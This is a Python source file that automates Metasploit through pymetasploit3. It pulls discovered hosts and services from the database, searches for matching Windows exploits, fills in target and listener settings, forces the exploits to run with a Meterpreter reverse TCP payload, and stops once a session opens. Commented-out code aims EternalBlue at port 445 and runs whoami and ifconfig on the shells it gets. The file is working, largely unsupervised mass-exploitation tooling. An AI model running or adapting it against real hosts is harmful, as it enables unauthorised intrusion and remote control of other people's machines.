import socket
import time

import pymetasploit3.msfrpc
from pymetasploit3 import msfrpc
from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcMethod

from common.utils import start_metasploit


def meterpreter_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'meterpreter':
            assert int(sid)
            yield sid


def shell_sid(client):
    s = client.sessions.list
    for sid in s:
        if s[sid]['type'] == 'shell':
            assert int(sid)
            yield sid
def run_module_with_output(console, mod, payload=None, run_as_job=False, timeout=301):
    """
    Execute a module and wait for the returned data

    Mandatory Arguments:
    - mod : the MsfModule object

    Optional Keyword Arguments:
    - payload : the MsfModule object to be used as payload
    """
    options_str = 'use {}/{}\n'.format(mod.moduletype, mod.modulename)
    if console.is_busy():
        raise msfrpc.MsfError('Console {} is busy'.format(console.cid))
    console.read()  # clear data buffer
    opts = mod.runoptions.copy()
    if payload is None:
        opts['DisablePayloadHandler'] = True

    # Set module params
    for k in opts.keys():
        options_str += 'set {} {}\n'.format(k, opts[k])

    # Set payload params
    if mod.moduletype == 'exploit':
        opts['TARGET'] = mod.target
        options_str += 'set TARGET {}\n'.format(mod.target)

        if 'DisablePayloadHandler' in opts and opts['DisablePayloadHandler']:
            pass
        elif isinstance(payload, msfrpc.PayloadModule):
            if payload.modulename not in mod.payloads:
                raise ValueError(
                    'Invalid payload ({}) for given target ({}).'.format(payload.modulename, mod.target))
            options_str += 'set payload {}\n'.format(payload.modulename)
            for k, v in payload.runoptions.items():
                if v is None or (isinstance(v, str) and not v):
                    continue
                options_str += 'set {} {}\n'.format(k, v)
        else:
            raise ValueError('No valid PayloadModule provided for exploit execution.')

    # Run the module without directly opening a command line
    options_str += 'run -z'
    if run_as_job:
        options_str += " -j"
    console.write(options_str)
    data = ''
    timer = 0
    while data == '' or console.is_busy():
        time.sleep(1)
        data += console.read()['data']
        timer += 1
        if timer > timeout:
            break
    return data

def get_exploits(client):
    """
    Get exploit module
    :param client: client object
    :param module: exploit module
    :return: exploit object
    """
    # exp = client.modules.use('exploit', module)
    # return exp

def exploit_hosts(client):
    """
    Get exploits for vulnerable host
    execute exploit
    :param client:
    :param hosts: list of hosts
    :return: list of exploits
    """

    # host = "192.168.86.63"
    # port = "445"

    # ex = client.modules.execute(ex)
    # ex['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
    # print(ex['LHOST'])
    # ex['LHOST'] = '192.168.86.64'
    # ex['LPORT'] = 4444

    cid = client.consoles.console().cid
    console = client.consoles.console(cid)


    services = client.db.workspaces.workspace('default').services.list
    hosts = client.db.workspaces.workspace('default').hosts.list
    print(hosts)
    for service in services:
        port = service['port']
        print(type(hosts))
        # get the host object where host['address'] == service['host']
        host = next((host for host in hosts if host['address'] == service['host']), None)
        # print(host)
        platform = host['os_name']
        service_name = service['name']
        # if port == 445:
        #     exploit = "windows/smb/ms17_010_eternalblue"
        #     ex = client.modules.use('exploit', exploit)
        #     print(ex.options)
        #     print(ex.missing_required)
        #     print(ex.required)
        #     ex.runoptions['RHOSTS'] = host['address']
        #     ex.runoptions['RPORT'] = port
        #     ex['RHOSTS'] = host['address']
        #     # ex['RPORT'] = port
        #     # ex['CheckModule'] = ex.check()
        #     ex['WORKSPACE'] = 'default'
        #     ex['VERBOSE'] = True
        #     for o in ex.options:
        #         print(o)
        #         print(ex[o])
        #
        #     print(ex.targetpayloads())
        #     print(run_module_with_output(console, ex))
        #
        #     print(console.read())
        #     time.sleep(5)
        #     data = console.read()['data']
        #     print(data)
        #     while data != '' or console.is_busy():
        #         print(data)
        #         time.sleep(1)
        #         data = console.read()['data']
        #     console.write('back')
        # else:
        query = f'port:{port} platform:windows type:exploit arch:x64'
        print("Looking for exploits that satisfy: \n\t" + query)
        exploits = client.modules.search(query)
        # print(exploits)
        for exploit_dict in exploits:
            fullname = exploit_dict['fullname'].split("/")
            ex_type = fullname[0]
            exploit = "/".join(fullname[1:])
            try:
                print(exploit)
                ex = client.modules.use(ex_type, exploit)
                if "windows/x64/meterpreter/reverse_tcp" not in ex.targetpayloads() and "windows/x64/meterpreter/reverse_tcp" not in ex.targetpayloads():
                    continue

                elif 'RPORT' in ex.options and port != ex['RPORT']:
                    print("RPORT is not the same as the port of the service")
                    continue
                print("got this far")
                # print(ex.options)
                # print(ex.missing_required)
                # print(ex.required)

                if 'RHOSTS' in ex.missing_required:
                    ex.runoptions['RHOSTS'] = host['address']
                    print(ex.runoptions['RHOSTS'])

                if 'RPORT' in ex.missing_required:
                    ex.runoptions['RPORT'] = port
                    print(ex.runoptions['RPORT'])
                if 'LHOST' in ex.missing_required:
                    ex.runoptions['LHOST'] ='127.0.0.1'
                    print(ex.runoptions['LHOST'])
                if 'LPORT' in ex.missing_required:
                    ex['LPORT'] = "4444"
                    print(ex.runoptions['LPORT'])
                if 'SRVHOST' in ex.missing_required:
                    ex.runoptions['SRVHOST'] = '0.0.0.0'
                    print(ex.runoptions['SRVHOST'])
                if 'SRVPORT' in ex.missing_required:
                    ex.runoptions['SRVPORT'] = "8080"
                    print(ex.runoptions['SRVPORT'])
                if 'ForceExploit' in ex.runoptions:
                    ex.runoptions['ForceExploit'] = 'true'
                    print(ex.runoptions['ForceExploit'])
                if 'AllowNoCleanup' in ex.runoptions:
                    ex.runoptions['AllowNoCleanup'] = 'true'
                    print(ex.runoptions['AllowNoCleanup'])
                if len(ex.targets) > 1 and 'windows' not in str(list(ex.targets.values())[0]).lower():
                    if host['os_name'] in list(ex.targets.values()):
                        ex.runoptions['TARGET'] = list(ex.targets.keys())[list(ex.targets.values()).index(host['os_name'])]
                    print(ex.targets)
                    ex.runoptions['TARGET'] = int(input("Enter target #: "))
                    print(ex.runoptions['TARGET'])
                # ex['CheckModule'] = ex.check()
                ex.runoptions['WORKSPACE'] = 'default'

                ex.runoptions['VERBOSE'] = 'true'
                print("MISSING")
                for o in ex.missing_required:
                    print(o)


                out = run_module_with_output(console, ex)
                # print(out)  # print output

                print(out)
                print(console.read())
                time.sleep(5)
                data = console.read()['data']
                while data != '' or console.is_busy():
                    print(data)
                    time.sleep(1)
                    data = console.read()['data']
                console.write('back')
            except Exception as e:
                print(e)
                print(type(e))
                continue
            if client.sessions.list:
                print("Session created")
                print(client.sessions.list)
                return client
    return client
    # for host in hosts:
    #     print(host)
    #     for exploit in client.modules.exploits:
    #         print(exploit)
    #         ex = client.modules.use('exploit', exploit)
    #         ex['RHOSTS'] = host
    #         ex['RPORT'] = port
    #         ex['CheckModule'] = ex.check()
    #         ex['WORKSPACE'] = 'default'
    #         ex['VERBOSE'] = True
    #         for o in ex.options:
    #             print(o)
    #             print(ex[o])
    #         ex = client.modules.execute(ex)
    #         ex['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
    #         print(ex['LHOST'])
    #         ex['LHOST'] = '
    # get vulnerable hosts from db
    # print("made it here")
    # hosts = client.db.workspaces.workspace('default').hosts.list
    # query = 'name:eternalblue port:445 platform:windows type:exploit arch:x64'
    #
    # for host in hosts:
    #
    #     # vulns = client.db.workspaces.workspace('default').vulns.get(host=host['address'])
    #     services = client.db.workspaces.workspace('default').services.get(host=host['address'])
    #     # print(services)
    #     # get exploits for each vulnerability
    #     for service in services:
    #         if service['state'] != 'open':
    #             continue
    #         print(host["os_flavor"])
    #         print(host["os_name"])
    #         rport = service['port']
    #         # target = host["os_flavor"] if host["os_flavor"] != "Unknown" else "7"
    #         platform = host["os_name"] if host["os_name"] != "Unknown" else "windows"
    #         # query = f'port:{rport} platform:{platform} type:exploit arch:x64'
    #         print(query)
    #         # search exploits by vulnerability name
    #         exploits = client.modules.search(query)
    #         # print(exploits)
    #         # return client
    #         # print("And because we had to use this shitty library, it took", time.time() - start, "seconds")
    #         # execute exploit
    #
    #         for exploit_dict in exploits:
    #             fullname = exploit_dict['fullname'].split("/")
    #             type = fullname[0]
    #             exploit = "/".join(fullname[1:])
    #             print(f"Executing exploit {exploit} on host {host['address']}")
    #             # print(client.call(MsfRpcMethod.ModuleInfo, ["exploit", exploit]))
    #             os_name = host['os_name'] if host['os_name'] != "Unknown" else "windows"
    #             # if os_name in exploit:
    #             #     print("FOUND WINDOWS EXPLOIT")
    #             # else:
    #             #     continue
    #             #     payload = f'cmd/unix/reverse'
    #             # else:
    #             #     continue
    #             # print("Executing exploit:", exploit)
    #             # create cons
    #             ex = client.modules.use(type, exploit)
    #             if ex["RPORT"] != rport:
    #                 continue
    #             print(rport)
    #             # print("Created exploit object")
    #
    #             ex['RHOSTS'] = host['address']
    #             # if 'LHOSTS' in ex:
    #             #     ex['LHOSTS'] = host['address']
    #             # if 'RPORT' in ex:
    #             #     ex['RPORT'] = rport
    #             # if 'LPORT' in ex:
    #             #     ex['LPORT'] = vuln['port']
    #             # if 'SRVPORT' in ex:
    #             #     ex['SRVPORT'] = vuln['port']
    #
    #             print("Set RHOSTS")
    #             print(ex.targets)
    #             print(ex['RHOSTS'])
    #             print(host['address'])
    #             try:
    #
    #                 print("Attempting to execute all payloads")
    #                 # ex['SRVHOST'] = host['address']
    #                 # print()
    #                 # if "windows/meterpreter/reverse_tcp" in ex.targetpayloads():
    #                 #     print("Found meterpreter payload")
    #                 #     # get current console
    #                 #     print(client.consoles.list)
    #                 cid = client.consoles.list[0]['id']
    #                 print("Created console")
    #                 print("Executing exploit")
    #
    #                 print("Created console")
    #                 try:
    #                     print(client.consoles.console(cid).run_module_with_output(ex,
    #                                                                               payload="windows/x64/meterpreter/reverse_tcp"))
    #                 except:
    #                     # run async
    #                     print("Running async")
    #
    #                     # print(client.consoles.console(cid).run_module_with_output(ex))
    #
    #                     # ex['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
    #                     # ex.execute()
    #                     # ex['LHOST'] = "
    #                     # # ex['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
    #                     # # ex['TARGET'] = ex.targets[0]
    #                 # payloads = ex.targetpayloads()[:]
    #                 # ex.target = platform + " " + target
    #                 # # filter out payloads that are not compatible with the target
    #                 # payloads = [p for p in payloads if os_name in p and "meterpreter" in p]
    #                 # print(payloads)
    #                 # ex.execute(payload="windows/meterpreter/reverse_tcp")
    #                 # print("Set PAYLOAD")
    #                 #
    #                 # # ex['RHOSTS'] = host['address']
    #                 # # for payload in ex.targetpayloads():
    #                 # #     if host["os_name"] in payload:
    #                 # #         ex.execute(payload=payload)
    #                 # #         print("Executed payload:", payload)
    #                 print("MISSING", ex.missing_required)
    #                 ex["CheckModule"] = client.modules.check(type, exploit)
    #                 print(ex["CheckModule"])
    #                 # out = ex.execute()
    #                 # print(out)
    #
    #                 # print("Created console")
    #                 # print("Executing exploit")
    #                 print(client.consoles.console(cid).run_module_with_output(ex, ))
    #                 client.consoles.console(cid).write("run")
    #                 time.sleep(5)
    #                 data = client.consoles.console(cid).read()['data']
    #                 while data != '':
    #                     data = client.consoles.console(cid).read()['data']
    #                     print(data)
    #                     time.sleep(1)
    #                 # print(client.consoles.console(cid).read())
    #                 print(client.sessions.list)
    #                 if (len(client.sessions.list) > 0):
    #                     print("Session created")
    #                     exit()
    #
    #                 print("Executed exploit")
    #                 client.consoles.console(cid).write("sessions -l")
    #                 print(client.consoles.console(cid).read())
    #                 client.consoles.console(cid).write("back")
    #                 # ex.execute(payload='windows/meterpreter/reverse_tcp')
    #                 # print("Executed exploit")
    #             # print(ex.targetpayloads())
    #             except AttributeError as e:
    #                 print(type(e))
    #                 print(e)
    #                 print(ex._info)
    #                 # print(ex.__dict__)
    #                 print("No payloads")
    #             except KeyError as e:
    #                 # print(type(e))
    #                 # print(ex)
    #                 # # print(dict(ex).keys())
    #                 # # print(ex._info)
    #                 # # print(ex.__dict__)3
    #                 # print("No payloads")
    #                 pass
    #
    #             print("Executed exploit:", exploit)
    #             # time.sleep(5)
    #
    #         print("Finished executing exploits")
    #         # print("Finished getting exploits for each vulnerability")
    #     print("Finished getting vulnerabilities for each host from db")
    # return client


def main(client):
    try:
        # print(client.modules.exploits)

        # print vulnerability information
        client = exploit_hosts(client)
        # pymetasploit3.msfrpc.ShellSession(client, 1)
        # create a shell session
        # shell = client.sessions.session(1)
        # print(shell)
        # m_sid = meterpreter_sid(client)
        # s_sid = shell_sid(client)
        print(client.sessions.list)

        # get meterpreter sessions
        # meterpreter = client.sessions.session(next(m_sid))
        # shell = client.sessions.session(next(s_sid))
        # # list all sessions
        # shell.write('whoami')  # write commands you want into the target console
        # time.sleep(1)
        # ifRoot = shell.read()  # checks if the session shell has root access
        # print(ifRoot)
        # shell.write('ifconfig')  # returns the network information of the shell
        # time.sleep(1)
        # ifconfig = shell.read()
        # print(ifconfig)
        # shell.write('ipconfig')  # returns the network information of the shell
        # time.sleep(1)
        # ipconfig = shell.read()
        # print(ipconfig)
    except Exception as e:
        print(e)
    finally:
        # gracefully disconnect from db
        return client
        # gracefully disconnect from msfrpcd
        # client.logout()
        # return to main
